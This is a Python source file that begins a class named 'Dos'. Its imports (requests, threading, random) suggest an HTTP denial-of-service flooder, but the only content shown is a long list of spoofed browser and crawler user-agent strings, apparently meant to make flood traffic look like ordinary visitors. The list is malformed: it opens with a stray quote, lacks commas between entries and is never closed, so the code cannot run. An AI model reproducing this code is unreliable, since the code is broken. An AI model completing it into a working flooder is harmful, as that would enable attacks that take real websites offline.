import requests
from urllib.parse import urlparse
import random
import time
import threading
import sys
from colorama import Style, Fore
from pystyle import Colorate, Colors,Write
class Dos:
    USER_AGENTS = [
        ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9"
"Mozilla/5.0 (iPhone; CPU iPhone OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/44.0.2403.67 Mobile/12D508 Safari/600.1.4"
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
"Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Firefox/38.0"
"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36"
"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240"
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/42.0 Safari/537.31"
"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10"
"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)"
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/50.0.125 Chrome/44.0.2403.125 Safari/537.36"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36 Edge/12.0"
"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0"
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; GTB7.5; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C)"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240"
"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko"
"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0) LinkCheck by Siteimprove.com"
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko"
"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4"
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
"Mozilla/5.0 (BB10; Touch) AppleWebKit/537.35+ (KHTML, like Gecko) Version/10.3.2.2339 Mobile Safari/537.35+"
"Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0"
"Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 525) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537"
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:37.0) Gecko/20100101 Firefox/37.0"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/44.0.2403.89 Chrome/44.0.2403.89 Safari/537.36"
"Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.1.25 (KHTML, like Gecko) QuickLook/5.0"
"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0"
"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko"
"Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
"Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko"
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
"Mozilla/5.0 (Windows NT 6.0; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0"
"Mozilla/5.0 (Linux; U; Android 4.3; en-us; ZTE-Z667G Build/JLS36C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; ASU2JS; rv:11.0) like Gecko"
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0"
"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
"Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
"Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4"
"Mozilla/5.0 (Windows NT 6.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4"
"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like Gecko"
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)"
"Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko"
"Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53"
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
"Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4"
"Mozilla/5.0 (X11; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0"
"Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:35.0) Gecko/20100101 Firefox/35.0"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/6.1.6 Safari/537.78.2"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36"
"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
"Mozilla/5.0 (Mobile; rv:32.0) Gecko/32.0 Firefox/32.0"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729; Tablet PC 2.0; McAfee; AmericasCardroom; BRI/2; GWX:DOWNLOADED)"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/7.0)"
"Mozilla/5.0 (iPad; CPU OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12D508 Safari/600.1.4"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2483.0 Safari/537.36"
"Mozilla/5.0 (Windows NT 5.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E; MS-RTC LM 8)"
"Mozilla/5.0 (Android; Linux armv7l; rv:5.0) Gecko/20110615 Firefox/5.0 Fennec/5.0"
"Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12B466 [FBAN/FBIOS;FBAV/37.0.0.21.273;FBBV/13822349;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/8.1.3;FBSS/2; FBCR/fido;FBID/phone;FBLC/fr_FR;FBOP/5]"
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0 Cyberfox/40.0"
"Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Mercury/8.7 Mobile/11B554a Safari/9537.53"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729; GWX:QUALIFIED; MASMJS)"
"Mozilla/5.0 (iPhone; CPU iPhone OS 7_1 like Mac OS X) AppleWebKit (KHTML, like Gecko) Mobile (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; NP06; rv:11.0) like Gecko"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; ARM; Trident/7.0; Touch; .NET4.0E; .NET4.0C; Tablet PC 2.0)"
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.0.19) Gecko/2010062819 Firefox/3.0.19 Flock/2.6.1"
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25"
"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25"
"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"
"Mozilla/5.0 (Linux; Android 4.4; Nexus 5 Build/_BuildID_) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.4.10 (KHTML, like Gecko) Version/8.0.4 Safari/600.4.10"
"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch; MAARJS)"
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-us) AppleWebKit/537+ (KHTML, like Gecko) Version/5.0 Safari/537.6+ Midori/0.4"
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
"Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H143 [FBAN/FBIOS;FBAV/37.0.0.21.273;FBBV/13822349;FBDV/iPad2,5;FBMD/iPad;FBSN/iPhone OS;FBSV/8.4;FBSS/1; FBCR/;FBID/tablet;FBLC/en_US;FBOP/1]"
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; CMDTDF; .NET CLR 1.1.4322)"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:40.0) Gecko/20100101 Firefox/40.0"
"Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:35.0) Gecko/20100101 Firefox/35.0"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/43.0.2357.81 Chrome/43.0.2357.81 Safari/537.36"
"Mozilla/5.0 (Windows NT 6.2; rv:36.0) Gecko/20100101 Firefox/36.0"
"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)"
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.77 Large Screen Safari/534.24 GoogleTV/092754"
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
"Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0"
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0); 360Spider(compatible; HaosouSpider; http://www.haosou.com/help/help_3_2.html)"
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; FunWebProducts; rv:11.0) like Gecko"
"Mozilla/5.0 (Linux; Android 4.4.2; 0PCV1 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.133 Mobile Safari/537.36"
"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2423.0 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
"Mozilla/5.0 (Windows NT 6.0; rv:40.0) Gecko/20100101 Firefox/40.0"
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 Safari/537.36"
"Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; GT-I9505 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.74.9 (KHTML, like Gecko) Version/7.0.2 Safari/537.74.9"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
"Mozilla/5.0 (Windows NT 6.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:37.0) Gecko/20100101 Firefox/37.0"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:40.0) Gecko/20100101 Firefox/40.0"
"Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; GT-N8013 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17"
"SAMSUNG-GT-E2350B/1.0 Openwave/6.2.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:36.0) Gecko/20100101 Firefox/36.0"
"Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3"
"Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; 0PCV1 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:36.0) Gecko/20100101 Firefox/36.0"
"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; LCJB; rv:11.0) like Gecko"
"Mozilla/5.0 (Windows NT 6.1; rv:37.0) Gecko/20100101 Firefox/37.0"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
"Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B436 Safari/600.1.4"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/6.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729; Zune 4.7; Tablet PC 2.0)"
"Mozilla/5.0 (Windows NT 6.2; rv:38.0) Gecko/20100101 Firefox/38.0"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:37.0) Gecko/20100101 Firefox/37.0"
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:40.0) Gecko/20100101 Firefox/40.0"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:36.0) Gecko/20100101 Firefox/36.0"
"Mozilla/5.0 (Windows NT 5.1; rv:36.0) Gecko/20100101 Firefox/36.0"
"Mozilla/5.0 (Windows NT 6.2; rv:37.0) Gecko/20100101 Firefox/37.0"
"Mozilla/5.0 (Windows NT 5.1; rv:37.0) Gecko/20100101 Firefox/37.0"
"Mozilla/5.0 (Windows NT 5.1; rv:38.0) Gecko/20100101 Firefox/38.0"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:36.0) Gecko/20100101 Firefox/36.0"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.91 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/6.2.6 Safari/537.85.15"
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2"
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MASMJS; rv:11.0) like Gecko"
"Mozilla/5.0 (Windows NT 6.2; rv:35.0) Gecko/20100101 Firefox/35.0"
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:35.0) Gecko/20100101 Firefox/35.0"
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C)"
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/43.0.2357.130 Chrome/43.0.2357.130 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:37.0) Gecko/20100101 Firefox/37.0"
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Dragon/44.5.7.268 Chrome/44.0.2403.125 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
"Mozilla/5.0 (Linux; Android 4.4.2; RCT6203W46 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.133 Safari/537.36"
"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/6.2.7 Safari/537.85.16"
"Mozilla/5.0 (Windows NT 6.2; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
"Mozilla/5.0 (Linux; Android 5.0.2; SGH-T679 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:37.0) Gecko/20100101 Firefox/37.0"
"Mozilla/5.0 (Linux; Android 5.0.2; XT1068 Build/LXB22.46-28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.81 Mobile Safari/537.36 OPR/28.0.1764.90386"
"SAMSUNG-GT-E2252/E2252DDNC1 NetFront/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:36.0) Gecko/20100101 Firefox/36.0"
"Mozilla/5.0 (X11; Linux i686 (x86_64)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
"Mozilla/5.0 (compatible) Feedfetcher-Google;(+http://www.google.com/feedfetcher.html)"
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; McAfee; InfoPath.3)"
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2453.0 Safari/537.36"
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0)"
"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H321 Safari/600.1.4"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/7.1.6 Safari/537.85.15"
"Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36"
"Mozilla/5.0 (Linux; Android 5.1.1; C2004 Build/LMY48G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.117 Mobile Safari/537.36"
"Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/E7FBAF"
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0"
"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
